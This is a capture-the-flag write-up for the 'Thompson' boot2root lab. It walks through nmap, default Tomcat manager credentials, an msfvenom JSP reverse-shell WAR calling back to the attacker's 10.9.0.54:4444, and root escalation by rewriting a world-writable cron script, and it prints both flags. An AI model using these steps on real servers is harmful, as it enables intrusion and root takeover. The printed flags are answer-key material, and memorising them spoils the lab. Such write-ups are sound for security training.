# Thompson

boot2root machine for FIT and bsides guatemala CTF

read user.txt and root.txt

# #1 - user.txt

Nmap discovers 3 ports, 1 of being an Apache Tomcat application, on port 8080:

~~~
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

There is no `robots.txt` file, but a `dirsearch` scan revealed the presence of a `/manager` directory.

Connecting to it requires an authentication, but credentials are revealed on the following page:

~~~
$ curl -i http://10.10.61.255:8080/manager/html
HTTP/1.1 401 
Cache-Control: private
Expires: Wed, 31 Dec 1969 16:00:00 PST
WWW-Authenticate: Basic realm="Tomcat Manager Application"
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 2473
Date: Mon, 29 Jun 2020 18:03:37 GMT

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>

[REDACTED]

</html>&lt;role rolename="manager-gui"/&gt;
&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;

[REDACTED]

</html>
~~~

Let's connect to the manager using `tomcat:s3cret`. From here, we have a page that allows us to:
 
* Manage applications (start, stop, undeploy)
* Upload new applications (via a war file)

Let's use `msfvenom` to make a JSP reverse shell in a war file:

~~~
$ msfvenom -p java/jsp_shell_reverse_tcp lhost=10.9.0.54 lport=4444 -f war -o shell.war
Payload size: 1090 bytes
Final size of war file: 1090 bytes
Saved as: shell.war
~~~

Now, open a listener in Metasploit:

~~~
$ msfconole -q
msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp 
payload => java/jsp_shell_reverse_tcp
msf5 exploit(multi/handler) > set lhost 10.9.0.54
lhost => 10.9.0.54
msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.9.0.54:4444 
msf5 exploit(multi/handler) > 
~~~

Back to the manager, upload `shell.war` (it will automatically deploy it to the server) and from the applications list, click on the link (it will redirect you to `/shell`). You should get a reverse shell in msfconsole.

~~~
[*] Command shell session 1 opened (10.9.0.54:4444 -> 10.10.96.20:60212) at 2020-06-30 07:42:41 +0200

msf5 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type              Information  Connection
  --  ----  ----              -----------  ----------
  1         shell java/linux               10.9.0.54:4444 -> 10.10.96.20:60212 (10.10.96.20)

msf5 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

SHELL=/bin/bash script -q /dev/null
tomcat@ubuntu:/$ id
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
tomcat@ubuntu:/$ cat /home/jack/user.txt
cat /home/jack/user.txt
39400c90bc683a41a8935e4719f181bf
tomcat@ubuntu:/$ 
~~~

User flag: `39400c90bc683a41a8935e4719f181bf`

# #2 - root.txt

Notice that there is a crontab run by `root` every minute, that executes `id.sh` script located in jack's home:

~~~
tomcat@ubuntu:/home/jack$ cat /etc/crontab   
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	root	cd /home/jack && bash id.sh
#
~~~

The script outputs the result of the `id` command to `test.txt`, and the file is writeable to the world.

~~~
tomcat@ubuntu:/home/jack$ cat id.sh
cat id.sh
#!/bin/bash
id > test.txt
~~~

Let's modify the script so that it reads the root flag instead:

~~~
tomcat@ubuntu:/home/jack$ printf '#!/bin/bash\ncat /root/root.txt > test.txt' > id.sh
<rintf '#!/bin/bash\ncat /root/root.txt > test.txt' > id.sh                  
tomcat@ubuntu:/home/jack$ cat id.sh
cat id.sh
#!/bin/bash
cat /root/root.txt > test.txt
~~~

After a short while, the `test.txt` file contains the root flag.

~~~
tomcat@ubuntu:/home/jack$ cat test.txt	
d89d5391984c0450a95497153ae7ca3a
~~~

*Notice that we could do much better here, and take advantage of the fact that the script is executed by root to create a new user, and grant the user root privileges. However, as our intend is to get the root flag only, that should be enough.*

Root flag: `d89d5391984c0450a95497153ae7ca3a`
